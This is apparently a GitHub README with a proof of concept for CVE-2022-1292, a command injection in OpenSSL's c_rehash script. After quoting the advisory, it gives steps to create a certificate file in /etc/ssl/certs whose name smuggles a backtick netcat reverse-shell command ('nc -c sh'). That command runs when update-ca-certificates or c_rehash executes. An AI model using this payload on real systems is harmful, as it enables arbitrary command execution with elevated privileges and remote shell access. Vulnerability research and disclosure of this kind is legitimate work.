# CVE-2022-1292 POC
![POC Screenshot](https://user-images.githubusercontent.com/105424007/171022147-b7699d2b-7dd3-4b49-9e52-767e36d1d3a2.png)

## Description
```
The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. 
This script is distributed by some operating systems in a manner where it is automatically executed.
On such operating systems, an attacker could execute arbitrary commands with the privileges of the script.
Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool.

This script is executed by update-ca-certificates, from
ca-certificates, to re-hash certificates in /etc/ssl/certs/. An attacker able
to place files in this directory could execute arbitrary commands with the
privileges of the script.
```

## POC
1. Navigate to ``/etc/ssl/certs/`` (default) or other paths configured in update-ca-certificates
2. ```echo "-----BEGIN CERTIFICATE-----" > "hey.crt\`nc -c sh 127.0.0.1 12345\`"``` *(nc as payload example)*
3. Then wait until execution of update-ca-certificates. You can trigger it manually with ``c_rehash .``
